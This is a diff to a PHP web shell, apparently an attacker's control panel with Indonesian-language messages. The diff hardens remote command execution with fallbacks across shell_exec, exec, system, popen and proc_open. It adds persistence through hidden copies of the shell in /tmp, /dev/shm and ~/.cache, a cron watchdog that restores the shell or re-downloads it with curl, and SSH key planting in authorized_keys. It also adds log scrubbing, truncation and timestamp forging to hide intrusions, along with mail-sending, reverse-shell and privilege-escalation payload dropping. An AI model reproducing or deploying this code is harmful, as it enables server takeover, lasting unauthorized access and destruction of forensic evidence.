@@ -1,7 +1,35 @@
 <?php
-error_reporting(0);
-set_time_limit(0);
-@session_start();
+$__diag = isset($_GET['diag']) && $_GET['diag'] !== '';
+@error_reporting($__diag ? E_ALL : (E_ALL & ~E_DEPRECATED & ~E_NOTICE));
+@ini_set('display_errors', $__diag ? '1' : '0');
+@ini_set('log_errors', '1');
+if ($__diag) { @ini_set('display_startup_errors', '1'); }
+
+if (!function_exists('random_bytes')) {
+    function random_bytes($length) {
+        if (function_exists('openssl_random_pseudo_bytes')) {
+            $b = openssl_random_pseudo_bytes($length);
+            if (is_string($b) && strlen($b) === $length) return $b;
+        }
+        $b = '';
+        for ($i = 0; $i < $length; $i++) $b .= chr(mt_rand(0, 255));
+        return $b;
+    }
+}
+
+register_shutdown_function(function () {
+    $e = error_get_last();
+    if ($e && in_array($e['type'], array(E_ERROR, E_PARSE, E_CORE_ERROR, E_COMPILE_ERROR))) {
+        $log = __DIR__ . '/.rct_fatal.log';
+        @file_put_contents(
+            $log,
+            date('c') . ' php=' . PHP_VERSION . ' ' . $e['message'] . ' in ' . $e['file'] . ':' . $e['line'] . "\n",
+            FILE_APPEND
+        );
+    }
+});
+if (function_exists('set_time_limit')) @set_time_limit(0);
+if (function_exists('session_start')) @session_start();
 $K = array(
     'ex'   => "\x65\x78\x65\x63",
     'she'  => "\x73\x68\x65\x6c\x6c\x5f\x65\x78\x65\x63",
@@ -200,7 +228,22 @@ if (!function_exists('scandir')) {
         return $files;
     }
 }
-function h($s) { return htmlspecialchars((string) $s, ENT_QUOTES, 'UTF-8'); }
+function h($s) {
+    $s = (string)$s;
+    if ($s === '') return '';
+    $r = @htmlspecialchars($s, ENT_QUOTES, 'UTF-8');
+    if ($r === '' && $s !== '') {
+        if (function_exists('mb_convert_encoding')) {
+            $s = @mb_convert_encoding($s, 'UTF-8', 'UTF-8');
+        }
+        if (function_exists('iconv')) {
+            $s = @iconv('UTF-8', 'UTF-8//IGNORE', $s);
+        }
+        if ($s === '') $s = '[binary]';
+        $r = @htmlspecialchars($s, ENT_QUOTES, 'UTF-8');
+    }
+    return $r;
+}
 function safe_real($path) { $rp = @realpath($path); if ($rp === false) return false; return $rp; }
 function perms($file) { $p = @fileperms($file); if ($p === false) return '----'; return substr(sprintf('%o', $p), -4); }
 function perms_string($file) {
@@ -258,6 +301,118 @@ function kill_pid($pid) {
 }
 function pkill_f($pat) { $f = F('ex'); @$f('pkill -9 -f ' . escapeshellarg($pat) . ' 2>/dev/null'); }
 function ensure_dir($d) { if (!@is_dir($d)) @mkdir($d, 0700, true); }
+$rct_state_file = __DIR__ . '/.rct_state.json';
+if (!@is_writable(__DIR__)) { $rct_state_file = '/tmp/.rct_state_' . substr(md5(__FILE__), 0, 8) . '.json'; }
+function rct_state_load($f) { $d = @file_get_contents($f); $x = $d !== false ? @json_decode($d, true) : null; return is_array($x) ? $x : array(); }
+function rct_state_save($f, $a) { return @file_put_contents($f, json_encode($a), LOCK_EX) !== false; }
+function rct_run($cmd) {
+    $ex = F('ex');
+    if (function_exists($ex) && is_callable($ex)) {
+        $o = array(); $rc = 0;
+        @call_user_func($ex, $cmd, $o, $rc);
+        if (!is_array($o)) $o = array((string)$o);
+        return array(implode("\n", $o), (int)$rc);
+    }
+    $she = F('she');
+    if (function_exists($she) && is_callable($she)) {
+        $r = @call_user_func($she, $cmd);
+        return array(($r === false ? '' : (string)$r), 0);
+    }
+    $sys = F('sys');
+    if (function_exists($sys) && is_callable($sys)) {
+        ob_start(); @call_user_func($sys, $cmd); return array((string)ob_get_clean(), 0);
+    }
+    return array(null, -1);
+}
+function rct_user_name() {
+    if (function_exists('posix_getpwuid') && function_exists('posix_geteuid')) {
+        $pw = @posix_getpwuid(@posix_geteuid());
+        if (is_array($pw) && !empty($pw['name'])) return $pw['name'];
+    }
+    $u = @get_current_user();
+    return $u ? $u : 'www-data';
+}
+function rct_cron_file() {
+    $user = rct_user_name();
+    $cands = array('/var/spool/cron/crontabs/' . $user, '/var/spool/cron/' . $user);
+    foreach ($cands as $c) { if (@is_file($c)) return @is_writable($c) ? $c : ''; }
+    foreach ($cands as $c) { if (@is_dir(dirname($c)) && @is_writable(dirname($c))) return $c; }
+    return '';
+}
+function rct_cron_read() {
+    list($o, $rc) = rct_run('crontab -l 2>/dev/null');
+    if ($rc !== -1 && $rc !== 127) return array((string)$o, 'crontab -l');
+    $cf = rct_cron_file();
+    if ($cf !== '' && @is_file($cf) && @is_readable($cf)) return array((string)@file_get_contents($cf), 'spool ' . $cf);
+    return array('', $rc === -1 ? 'exec mati' : 'kosong');
+}
+function rct_cron_filter($marker) {
+    list($io, $irc) = rct_run('( crontab -l 2>/dev/null | grep -v "' . $marker . '" ) | crontab - 2>&1');
+    if ($irc !== -1 && $irc !== 127) return array($irc === 0, 'crontab rc=' . $irc . (trim((string)$io) !== '' ? ' ' . $io : ''));
+    $cf = rct_cron_file();
+    if ($cf === '' || !@is_file($cf) || !@is_writable($cf)) return array(false, 'exec mati & spool cron nggak writable');
+    $cur = (string)@file_get_contents($cf);
+    $keep = array();
+    foreach (preg_split("/\r\n|\n|\r/", $cur) as $cl) { if (trim($cl) === '' || strpos($cl, $marker) !== false) continue; $keep[] = $cl; }
+    $ok = @file_put_contents($cf, ($keep ? implode("\n", $keep) . "\n" : ''), LOCK_EX) !== false;
+    if ($ok) @chmod($cf, 0600);
+    return array($ok, 'spool ' . $cf);
+}
+function rct_home() {
+    $home = @getenv('HOME');
+    if (!$home && function_exists('posix_getpwuid') && function_exists('posix_geteuid')) {
+        $pw = @posix_getpwuid(@posix_geteuid());
+        if (is_array($pw) && !empty($pw['dir'])) $home = $pw['dir'];
+    }
+    return $home ? rtrim(str_replace('\\', '/', $home), '/') : '';
+}
+function rct_backup_dirs($base) {
+    $home = rct_home();
+    $list = array($base, @sys_get_temp_dir(), '/tmp', '/dev/shm', $home ? $home . '/.cache' : '');
+    $seen = array(); $out = array();
+    foreach ($list as $d) {
+        $d = $d ? rtrim(str_replace('\\', '/', $d), '/') : '';
+        if ($d === '' || isset($seen[$d]) || !@is_dir($d) || !@is_writable($d)) continue;
+        $seen[$d] = 1; $out[] = $d;
+    }
+    return $out;
+}
+function rct_make_backups($base) {
+    $made = array();
+    foreach (rct_backup_dirs($base) as $d) {
+        if (count($made) >= 4) break;
+        $p = $d . '/.rct_' . substr(md5(__FILE__ . mt_rand()), 0, 8) . '.php';
+        if (@copy(__FILE__, $p)) { @chmod($p, 0644); $made[] = $p; }
+    }
+    return $made;
+}
+function rct_mime_mail($from_name, $from_addr, $to, $subject, $body, $att_tmp, $att_name) {
+    $host = (isset($_SERVER['SERVER_NAME']) && $_SERVER['SERVER_NAME'] !== '') ? $_SERVER['SERVER_NAME'] : 'localhost';
+    $common = "MIME-Version: 1.0\r\nDate: " . date('r') . "\r\nMessage-ID: <" . md5(uniqid('', true)) . '@' . $host . ">\r\n";
+    $common .= "Return-Path: <" . $from_addr . ">\r\n";
+    $common .= "From: " . ($from_name !== '' ? '=?UTF-8?B?' . base64_encode($from_name) . '?= ' : '') . '<' . $from_addr . ">\r\n";
+    $common .= "To: " . $to . "\r\nSubject: =?UTF-8?B?" . base64_encode($subject) . "?=\r\n";
+    if ($att_tmp !== '' && @is_file($att_tmp) && @filesize($att_tmp) <= 10485760) {
+        $b = 'rct' . md5(uniqid('', true));
+        $name = preg_replace('/[^A-Za-z0-9._-]/', '_', basename($att_name));
+        $payload = "--" . $b . "\r\nContent-Type: text/html; charset=UTF-8\r\nContent-Transfer-Encoding: base64\r\n\r\n" . chunk_split(base64_encode($body)) . "\r\n";
+        $payload .= "--" . $b . "\r\nContent-Type: application/octet-stream; name=\"" . $name . "\"\r\nContent-Transfer-Encoding: base64\r\nContent-Disposition: attachment; filename=\"" . $name . "\"\r\n\r\n" . chunk_split(base64_encode((string)@file_get_contents($att_tmp))) . "\r\n--" . $b . "--\r\n";
+        return array($common . "Content-Type: multipart/mixed; boundary=\"" . $b . "\"\r\n", $payload);
+    }
+    return array($common . "Content-Type: text/html; charset=UTF-8\r\nContent-Transfer-Encoding: base64\r\n", chunk_split(base64_encode($body)));
+}
+function rct_tail($f, $n) {
+    $fp = @fopen($f, 'r');
+    if (!$fp) return 'gagal buka file';
+    $size = @filesize($f);
+    $chunk = 262144;
+    if ($size !== false && $size > $chunk) { @fseek($fp, $size - $chunk); @fgets($fp); }
+    $data = (string)@stream_get_contents($fp);
+    @fclose($fp);
+    $lines = preg_split("/\r\n|\n|\r/", $data);
+    if (count($lines) > $n) $lines = array_slice($lines, -$n);
+    return implode("\n", $lines);
+}
 $base = dirname(__FILE__);
 $cwd  = isset($_GET['path']) ? $_GET['path'] : '';
 if ($cwd === '') {
@@ -292,14 +447,97 @@ if ($resolved !== false) {
 
 $msg = '';
 if (isset($_POST['run_cmd'])) {
-    $cmd = $_POST['cmd'];
-    if ($cmd != '') {
-        $cd_cmd = '';
-        if ($cwd_real != '') { $cd_cmd = 'cd ' . escapeshellarg($cwd_real) . ' && '; }
-        $f = F('she');
-        $output = @$f($cd_cmd . $cmd . ' 2>&1');
-        if ($output === null || $output === false) { $output = 'Command execution failed or no output'; }
-        $msg = '<div style="background:#0a0e14; padding:12px; border-radius:6px; font-family:Consolas,monospace;"><b>Directory:</b> ' . h($cwd_real) . '<br><b>Command:</b> ' . h($cmd) . '<br><b>Output:</b><pre style="margin:8px 0 0 0; color:#7ee787; overflow-x:auto;">' . h($output) . '</pre></div>';
+    $cmd = isset($_POST['cmd']) ? (string)$_POST['cmd'] : '';
+    if ($cmd !== '') {
+        $exec_one = function ($shell_line, &$via, &$rc) {
+            $via = ''; $rc = null;
+            $chain = array('shell_exec', 'exec', 'system', 'passthru', 'popen', 'proc_open');
+            foreach ($chain as $efn) {
+                if (!function_exists($efn) || !is_callable($efn)) continue;
+                if ($efn === 'shell_exec') {
+                    $r = @call_user_func($efn, $shell_line);
+                    $via = $efn;
+                    return ($r === false) ? '' : (string)$r;
+                }
+                if ($efn === 'exec') {
+                    $o = array(); $code = 0;
+                    @call_user_func($efn, $shell_line, $o, $code);
+                    $via = $efn; $rc = (int)$code;
+                    return implode("\n", $o);
+                }
+                if ($efn === 'system' || $efn === 'passthru') {
+                    ob_start();
+                    $code = 0;
+                    @call_user_func($efn, $shell_line);
+                    $buf = ob_get_clean();
+                    $via = $efn;
+                    return ($buf === false) ? '' : $buf;
+                }
+                if ($efn === 'popen') {
+                    $h = @call_user_func($efn, $shell_line, 'r');
+                    if (!is_resource($h)) continue;
+                    $buf = '';
+                    while (!feof($h)) { $buf .= @fread($h, 8192); }
+                    $code = @pclose($h);
+                    $via = $efn; $rc = (int)$code;
+                    return $buf;
+                }
+                if ($efn === 'proc_open') {
+                    $desc = array(1 => array('pipe', 'w'), 2 => array('pipe', 'w'));
+                    $pipes = array();
+                    $p = @call_user_func($efn, $shell_line, $desc, $pipes);
+                    if (!is_resource($p)) continue;
+                    $o = isset($pipes[1]) ? @stream_get_contents($pipes[1]) : '';
+                    $e = isset($pipes[2]) ? @stream_get_contents($pipes[2]) : '';
+                    foreach ($pipes as $pp) { if (is_resource($pp)) @fclose($pp); }
+                    $code = @proc_close($p);
+                    $via = $efn; $rc = (int)$code;
+                    return $o . $e;
+                }
+            }
+            return null;
+        };
+        // shell sendiri yang nge-echo exit code, jadi kebaca walau primitive nggak balikin rc
+        $build_line = function ($cwd) use ($cmd) {
+            if (stripos(PHP_OS, 'WIN') === 0) {
+                $wbody = $cmd . ' 2>&1';
+                return $cwd === '' ? $wbody : 'cd /d ' . escapeshellarg($cwd) . ' && ' . $wbody;
+            }
+            $body = $cmd . ' 2>&1; echo "[rct_rc=$?]";';
+            if ($cwd === '') return $body;
+            return 'if cd ' . escapeshellarg($cwd) . ' 2>&1; then ' . $body . ' else echo "[RCT_CD_FAIL]"; fi';
+        };
+
+        $via = ''; $rc = null;
+        $output = $exec_one($build_line($cwd_real), $via, $rc);
+        $retried = '';
+        if ($output !== null && $cwd_real !== '' && strpos($output, '[RCT_CD_FAIL]') !== false) {
+            $via2 = ''; $rc2 = null;
+            $output = $exec_one($build_line(''), $via2, $rc2);
+            $via = $via2; $rc = $rc2;
+            $retried = ' &rarr; retry tanpa cd (' . h($cwd_real) . ' nggak bisa di-cd oleh shell)';
+        }
+
+        $shell_rc = null;
+        if ($output !== null && preg_match('/\[rct_rc=(-?\d+)\]/', $output, $mrc)) {
+            $shell_rc = (int)$mrc[1];
+            $output = preg_replace('/\s*\[rct_rc=-?\d+\]/', '', $output);
+        }
+        $output = trim((string)$output);
+        $rc_display = ($shell_rc !== null) ? (string)$shell_rc : (($rc !== null) ? (string)$rc : 'n/a');
+        if ($via === '' && $output === null) {
+            $output = 'Tidak ada primitive exec yang idup (shell_exec/exec/system/passthru/popen/proc_open semua diblokir). Cek tab Info.';
+            $via = 'none';
+        } elseif ($output === '') {
+            $output = '(no output)';
+        }
+        $rc_note = '';
+        if ($shell_rc !== null && $shell_rc !== 0) {
+            $rc_note = '<div style="color:#e3b341;font-size:11px;margin-top:6px;">Exit ' . (int)$shell_rc . ' = command-nya sendiri keluar non-zero, bukan primitive-nya gagal. '
+                . '<code>id</code> keluar 1 kalau ada UID/GID yang namanya nggak ke-resolve (umum di container / LVE / jail), '
+                . 'atau kalau bagian <code>cd</code> di depan gagal.</div>';
+        }
+        $msg = '<div style="background:#0a0e14; padding:12px; border-radius:6px; font-family:Consolas,monospace;"><b>Directory:</b> ' . h($cwd_real) . '<br><b>Command:</b> ' . h($cmd) . '<br><b>Primitive:</b> ' . h($via) . $retried . '<br><b>Exit:</b> ' . h($rc_display) . '<br><b>Output:</b><pre style="margin:8px 0 0 0; color:#7ee787; overflow-x:auto;">' . h($output) . '</pre>' . $rc_note . '</div>';
     }
 }
 if (isset($_GET['download']) && $_GET['download'] != '') {
@@ -585,10 +823,15 @@ $uname           = function_exists('php_uname') ? @php_uname() : '-';
 $self_user       = function_exists('get_current_user') ? @get_current_user() : '-';
 $open_basedir    = @ini_get('open_basedir');
 $disabled_parts = array();
+$df_ini_all = '';
+if (function_exists('ini_get_all')) {
+    $a_all = @ini_get_all(null, false);
+    if (is_array($a_all) && isset($a_all['disable_functions'])) $df_ini_all = $a_all['disable_functions'];
+}
 $raw_sources = array(
-    @ini_get('disable_functions'),
-    @get_cfg_var('disable_functions'),
-    (function_exists('ini_get_all') ? ((array)@ini_get_all(null, false)['disable_functions'] ?? '') : ''),
+    function_exists('ini_get') ? @ini_get('disable_functions') : '',
+    function_exists('get_cfg_var') ? @get_cfg_var('disable_functions') : '',
+    $df_ini_all,
 );
 foreach ($raw_sources as $src) {
     if (is_array($src)) $src = implode(',', $src);
@@ -646,7 +889,7 @@ $cpu = @file_get_contents('/proc/cpuinfo');
 $cores = $cpu ? substr_count($cpu, 'processor') : 0;
 $hostname = function_exists('gethostname') ? @gethostname() : '-';
 $tab = isset($_GET['tab']) ? $_GET['tab'] : '';
-if (!in_array($tab, array('shell','gs','cmd','info','upurl','domain',''), true)) $tab = '';
+if (!in_array($tab, array('shell','gs','cmd','info','upurl','domain','hunt','logs','mail',''), true)) $tab = '';
 $sh_dir = __DIR__ . '/.rct_shell'; $sh_pid = "$sh_dir/pid.txt"; $sh_log = "$sh_dir/out.log"; $sh_err = "$sh_dir/err.log";
 $gs_dir    = __DIR__ . '/.rct_gsocket'; $gs_pid    = "$gs_dir/pid.txt"; $gs_log    = "$gs_dir/out.log"; $gs_secret = "$gs_dir/secret.txt"; $gs_bin    = "$gs_dir/gs-netcat";
 function gs_bin_path() { global $gs_bin; return $gs_bin; }
@@ -711,6 +954,12 @@ $crit = array(
     'perl'      => (bool)which_bin('perl'),
     'gcc'       => (bool)which_bin('gcc'),
 );
+foreach (array('pcntl_exec','expect_popen','putenv','dl','mail','imap_open','mysqli_connect','fsockopen','symlink','link','chmod','copy','rename','tmpfile','glob') as $__cfn) {
+    $crit[$__cfn] = fn_ok($__cfn);
+}
+foreach (array('bash','sh','dash','busybox','ncat','socat','python','ruby','node','php','make','nasm','git','tar','zip','unzip','openssl','base64','crontab','systemctl','docker','mysql','psql','redis-cli','nmap','tcpdump','grep','find') as $__cbin) {
+    $crit[$__cbin] = (bool)which_bin($__cbin);
+}
 
 if (isset($_POST['batch_action']) && $_POST['batch_action'] !== '') {
     $ids = isset($_POST['batch_files']) ? (array)$_POST['batch_files'] : array();
@@ -1042,7 +1291,7 @@ if (isset($_POST['privesc_action'])) {
                                     . 'Jalankan dari tab Shell / Command Execution:<br>'
                                     . '<code>' . h($found_suid) . ' -p</code> &nbsp;— atau &nbsp; <code>' . h($found_suid) . '</code> (jika binary Anda berisi reverse-shell hardcoded)</div>';
                             }
-                            $writable_docroot = @is_writable($_SERVER['DOCUMENT_ROOT'] ?? '');
+                            $writable_docroot = @is_writable(isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : '');
                             if ($writable_docroot) {
                                 $payload_name = '.r00t_' . bin2hex(random_bytes(4)) . '.php';
                                 $payload_path = rtrim($_SERVER['DOCUMENT_ROOT'], '/') . '/' . $payload_name;
@@ -1107,6 +1356,282 @@ if (isset($_POST['privesc_action'])) {
                 @rmdir($tmp_dir);
             }
         }
+    }
+}
+
+if (isset($_POST['persist_action'])) {
+    $pa = isset($_POST['persist_action']) ? $_POST['persist_action'] : '';
+    $st = rct_state_load($rct_state_file);
+    if (!isset($st['backups']) || !is_array($st['backups'])) $st['backups'] = array();
+    $st['backups'] = array_values(array_filter($st['backups'], function ($p) { return @is_file($p); }));
+
+    if ($pa === 'make_backups' || $pa === 'install_watchdog') {
+        $target = (isset($_POST['p_target']) && trim($_POST['p_target']) !== '') ? trim($_POST['p_target']) : __FILE__;
+        $when = isset($_POST['p_interval']) ? (string)$_POST['p_interval'] : '15';
+        if (!in_array($when, array('1', '5', '10', '15', '30', '60', '@reboot'), true)) $when = '15';
+        $mode = isset($_POST['p_mode']) ? (string)$_POST['p_mode'] : 'backup';
+        $url = isset($_POST['p_url']) ? trim($_POST['p_url']) : '';
+
+        if ($st['backups'] === array()) {
+            $st['backups'] = rct_make_backups($base);
+            rct_state_save($rct_state_file, $st);
+        }
+
+        if ($pa === 'make_backups') {
+            $msg = $st['backups'] !== array()
+                ? 'Backup dibuat: <code>' . implode('</code>, <code>', array_map('h', $st['backups'])) . '</code>'
+                : 'Nggak ada direktori writable buat nyimpen backup.';
+        } else {
+            if (!@file_exists(dirname($target))) {
+                $msg = 'Target nggak valid: <code>' . h(dirname($target)) . '</code> nggak ada.';
+            } elseif ($mode !== 'url' && $st['backups'] === array() && $url === '') {
+                $msg = 'Butuh minimal satu sumber: backup lokal atau URL. Nggak ada dir writable buat backup.';
+            } elseif ($mode !== 'backup' && $url === '') {
+                $msg = 'Mode pakai URL tapi URL kosong.';
+            } else {
+                list($cv, $crc) = rct_run('crontab -l 2>&1');
+                if (stripos(PHP_OS, 'WIN') === 0) {
+                    $msg = 'Watchdog cron cuma jalan di Linux/Unix — target Windows nggak punya crontab.';
+                } else {
+                    $parts = array();
+                    if ($mode !== 'url') {
+                        foreach (array_slice($st['backups'], 0, 3) as $b) {
+                            $parts[] = 'cp ' . escapeshellarg($b) . ' ' . escapeshellarg($target) . ' 2>/dev/null';
+                        }
+                    }
+                    if ($mode !== 'backup' && $url !== '') {
+                        $parts[] = 'curl -fsS -m 20 ' . escapeshellarg($url) . ' -o ' . escapeshellarg($target) . ' 2>/dev/null';
+                    }
+                    $guard = 'test -s ' . escapeshellarg($target) . ' || { ' . implode(' || ', $parts) . '; }';
+                    $cron_when = ($when === '@reboot') ? '@reboot' : '*/' . (int)$when . ' * * * *';
+                    $line = $cron_when . ' /bin/sh -c ' . escapeshellarg($guard) . ' >/dev/null 2>&1 # RCT-WD';
+
+                    $installed = false; $via_desc = ''; $err = '';
+                    $cron_bin = ($crc !== -1 && $crc !== 127 && stripos((string)$cv, 'not found') === false);
+                    if ($cron_bin) {
+                        $install = '( crontab -l 2>/dev/null | grep -v "RCT-WD"; printf "%s\n" ' . escapeshellarg($line) . ' ) | crontab - 2>&1';
+                        list($io, $irc) = rct_run($install);
+                        if ($irc === 0) { $installed = true; $via_desc = 'crontab'; }
+                        else { $err = 'Gagal pasang via crontab (rc=' . $irc . '): <pre>' . h((string)$io) . '</pre>'; }
+                    }
+                    if (!$installed) {
+                        $cf = rct_cron_file();
+                        if ($cf === '') {
+                            if ($err === '') $err = 'Exec mati dan <code>/var/spool/cron</code> nggak writable — cron nggak bisa dipasang di sini. Pakai SSH key (nggak butuh exec).';
+                        } else {
+                            $cur = @is_file($cf) ? (string)@file_get_contents($cf) : '';
+                            $keep = array();
+                            foreach (preg_split("/\r\n|\n|\r/", $cur) as $cl) { if (trim($cl) === '' || strpos($cl, 'RCT-WD') !== false) continue; $keep[] = $cl; }
+                            $keep[] = $line;
+                            if (@file_put_contents($cf, implode("\n", $keep) . "\n", LOCK_EX) !== false) {
+                                @chmod($cf, 0600);
+                                $installed = true;
+                                $via_desc = 'spool ' . $cf . ' (tanpa exec)';
+                            } elseif ($err === '') {
+                                $err = 'Gagal nulis spool <code>' . h($cf) . '</code>.';
+                            }
+                        }
+                    }
+                    if ($installed) {
+                        $st['cron_line'] = $line;
+                        $st['target'] = $target;
+                        rct_state_save($rct_state_file, $st);
+                        $msg = 'Watchdog terpasang via ' . h($via_desc) . '.<br><b>Line:</b> <code>' . h($line) . '</code>';
+                    } else {
+                        $msg = $err;
+                    }
+                }
+            }
+        }
+    } elseif ($pa === 'remove_watchdog') {
+        list($ok, $info) = rct_cron_filter('RCT-WD');
+        if (isset($st['cron_line'])) unset($st['cron_line']);
+        rct_state_save($rct_state_file, $st);
+        $msg = $ok ? 'Baris watchdog dihapus (' . h($info) . ').' : 'Gagal hapus cron: ' . h($info);
+    } elseif ($pa === 'install_key') {
+        $key = isset($_POST['p_key']) ? trim($_POST['p_key']) : '';
+        $kpath = isset($_POST['p_keypath']) ? trim($_POST['p_keypath']) : '';
+        if ($kpath === '') $kpath = (rct_home() !== '' ? rct_home() : dirname(__DIR__)) . '/.ssh/authorized_keys';
+        if (!preg_match('/^(ssh-rsa|ssh-ed25519|ecdsa-sha2-[a-z0-9-]+|ssh-dss)\s+[A-Za-z0-9+\/=]+/', $key)) {
+            $msg = 'Format key nggak valid — harus diawali <code>ssh-ed25519 AAAA...</code> / <code>ssh-rsa AAAA...</code>.';
+        } else {
+            ensure_dir(dirname($kpath));
+            $cur = @is_file($kpath) ? (string)@file_get_contents($kpath) : '';
+            if (strpos($cur, '# RCT-KEY') !== false && strpos($cur, substr($key, 0, 40)) !== false) {
+                $msg = 'Key itu udah ada di <code>' . h($kpath) . '</code>.';
+            } else {
+                if ($cur !== '' && substr($cur, -1) !== "\n") $cur .= "\n";
+                if (@file_put_contents($kpath, $cur . $key . ' # RCT-KEY' . "\n", LOCK_EX) !== false) {
+                    @chmod($kpath, 0600);
+                    $st['keypath'] = $kpath;
+                    rct_state_save($rct_state_file, $st);
+                    $msg = 'Key masuk ke <code>' . h($kpath) . '</code>. Test: <code>ssh -i &lt;private&gt; user@host</code>';
+                } else {
+                    $msg = 'Gagal nulis <code>' . h($kpath) . '</code> (permission), coba path lain.';
+                }
+            }
+        }
+    } elseif ($pa === 'remove_keys') {
+        $kpath = isset($st['keypath']) ? $st['keypath'] : '';
+        if ($kpath === '' || !@is_file($kpath)) {
+            $msg = 'Nggak ada path key tercatat.';
+        } elseif (!@is_writable($kpath)) {
+            $msg = 'authorized_keys nggak writable: <code>' . h($kpath) . '</code>.';
+        } else {
+            $cur = (string)@file_get_contents($kpath);
+            $keep = array();
+            foreach (preg_split("/\r\n|\n|\r/", $cur) as $kl) { if (strpos($kl, '# RCT-KEY') === false) $keep[] = $kl; }
+            @file_put_contents($kpath, rtrim(implode("\n", $keep), "\n") . "\n", LOCK_EX);
+            unset($st['keypath']);
+            rct_state_save($rct_state_file, $st);
+            $msg = 'Baris key RCT dihapus dari <code>' . h($kpath) . '</code>.';
+        }
+    } elseif ($pa === 'restore_now') {
+        $target = isset($st['target']) ? $st['target'] : __FILE__;
+        if ($st['backups'] === array()) { $msg = 'Nggak ada backup lokal, restore manual nggak bisa.'; }
+        else {
+            $bk = $st['backups'][0];
+            $ok = @copy($bk, $target);
+            $via_desc = 'copy PHP';
+            if (!$ok) {
+                list($io, $irc) = rct_run('cp ' . escapeshellarg($bk) . ' ' . escapeshellarg($target) . ' 2>&1');
+                $ok = ($irc === 0);
+                $via_desc = 'cp';
+            }
+            $msg = $ok
+                ? 'Restore dari <code>' . h($bk) . '</code> ke <code>' . h($target) . '</code> via ' . h($via_desc) . '.'
+                : 'Gagal restore ke <code>' . h($target) . '</code> — target nggak writable.';
+        }
+    } elseif ($pa === 'remove_backups') {
+        $n = 0;
+        foreach ($st['backups'] as $b) { if (@is_file($b) && @unlink($b)) $n++; }
+        $st['backups'] = array();
+        rct_state_save($rct_state_file, $st);
+        $msg = 'Backup dihapus: ' . $n . ' file.';
+    } elseif ($pa === 'remove_all') {
+        list($cok, $cinfo) = rct_cron_filter('RCT-WD');
+        $n = 0;
+        foreach ($st['backups'] as $b) { if (@is_file($b) && @unlink($b)) $n++; }
+        $kpath = isset($st['keypath']) ? $st['keypath'] : '';
+        if ($kpath !== '' && @is_file($kpath) && @is_writable($kpath)) {
+            $cur = (string)@file_get_contents($kpath);
+            $keep = array();
+            foreach (preg_split("/\r\n|\n|\r/", $cur) as $kl) { if (strpos($kl, '# RCT-KEY') === false) $keep[] = $kl; }
+            @file_put_contents($kpath, rtrim(implode("\n", $keep), "\n") . "\n", LOCK_EX);
+        }
+        @unlink($rct_state_file);
+        $msg = 'Semua hook dibersihin — cron ' . ($cok ? 'ok' : 'gagal (' . h($cinfo) . ')') . ', backup dihapus=' . $n . ', key RCT dicabut, state file dibuang.';
+    }
+}
+
+if (isset($_POST['logs_action'])) {
+    $la = isset($_POST['logs_action']) ? $_POST['logs_action'] : '';
+    $lf = isset($_POST['log_file']) ? trim($_POST['log_file']) : '';
+    if ($la === 'scrub') {
+        if ($lf === '' || !@is_file($lf)) {
+            $msg = 'File log nggak ada: <code>' . h($lf) . '</code>';
+        } elseif (!@is_writable($lf)) {
+            $msg = 'File nggak writable: <code>' . h($lf) . '</code> — PHP jalan sebagai user lain.';
+        } else {
+            $pats = array();
+            $raw = isset($_POST['log_pattern']) ? (string)$_POST['log_pattern'] : '';
+            foreach (preg_split("/[,\n]+/", $raw) as $pp) { $pp = trim($pp); if ($pp !== '') $pats[] = $pp; }
+            if ($pats === array()) {
+                $msg = 'Pattern kosong — isi minimal satu string (IP, path, basename shell).';
+            } else {
+                $src = @file_get_contents($lf);
+                if ($src === false) {
+                    $msg = 'Gagal baca <code>' . h($lf) . '</code>.';
+                } else {
+                    @copy($lf, $lf . '.rct_bak');
+                    $lines = preg_split("/\r\n|\n|\r/", $src);
+                    $keep = array(); $cut = 0;
+                    foreach ($lines as $ln) {
+                        $hit = false;
+                        foreach ($pats as $pp) { if (stripos($ln, $pp) !== false) { $hit = true; break; } }
+                        if ($hit) $cut++; else $keep[] = $ln;
+                    }
+                    if (@file_put_contents($lf, implode("\n", $keep), LOCK_EX) !== false) {
+                        $msg = 'Scrub <code>' . h(basename($lf)) . '</code>: ' . $cut . ' baris dibuang, ' . count($keep) . ' sisa. Backup: <code>' . h(basename($lf)) . '.rct_bak</code>';
+                    } else {
+                        $msg = 'Gagal nulis ulang <code>' . h($lf) . '</code>.';
+                    }
+                }
+            }
+        }
+    } elseif ($la === 'truncate') {
+        if ($lf === '' || !@is_file($lf)) { $msg = 'File log nggak ada.'; }
+        elseif (!@is_writable($lf)) { $msg = 'File nggak writable: <code>' . h($lf) . '</code>.'; }
+        else {
+            @copy($lf, $lf . '.rct_bak');
+            $msg = (@file_put_contents($lf, '', LOCK_EX) !== false)
+                ? 'Dikosongkan: <code>' . h($lf) . '</code> (backup .rct_bak).'
+                : 'Gagal kosongin <code>' . h($lf) . '</code>.';
+        }
+    } elseif ($la === 'mtime') {
+        $t = isset($_POST['log_time']) ? strtotime(trim($_POST['log_time'])) : false;
+        if ($lf === '' || !@is_file($lf)) { $msg = 'File nggak ada: <code>' . h($lf) . '</code>'; }
+        elseif ($t === false || $t <= 0) { $msg = 'Format waktu nggak kebaca — pakai <code>2026-11-01 03:14:00</code>.'; }
+        else {
+            $msg = @touch($lf, $t)
+                ? 'mtime <code>' . h(basename($lf)) . '</code> &rarr; ' . date('Y-m-d H:i:s', $t)
+                : 'Gagal touch <code>' . h($lf) . '</code> (bukan owner).';
+        }
+    } elseif ($la === 'clean_rct') {
+        $n = 0;
+        foreach ((array)@glob(__DIR__ . '/.rct_*') as $f) { if (@is_file($f) && @unlink($f)) $n++; }
+        $lst = rct_state_load($rct_state_file);
+        foreach ((array)(isset($lst['backups']) ? $lst['backups'] : array()) as $b) { if (@is_file($b) && @unlink($b)) $n++; }
+        $msg = 'Jejak panel dibersihin: ' . $n . ' file (state, backup, sisa .rct_*).';
+    }
+}
+
+$m_auto_dom = '';
+foreach (array('SERVER_NAME', 'HTTP_HOST') as $m_dk) {
+    if ($m_auto_dom !== '' || empty($_SERVER[$m_dk])) continue;
+    $m_cand = strtolower(preg_replace('/:\d+$/', '', (string)$_SERVER[$m_dk]));
+    if (filter_var($m_cand, FILTER_VALIDATE_IP)) continue;
+    if (strpos($m_cand, '.') === false) continue;
+    if (preg_match('/^[a-z0-9.-]+$/', $m_cand)) $m_auto_dom = $m_cand;
+}
+if ($m_auto_dom === '') {
+    $m_hn = function_exists('gethostname') ? strtolower((string)@gethostname()) : '';
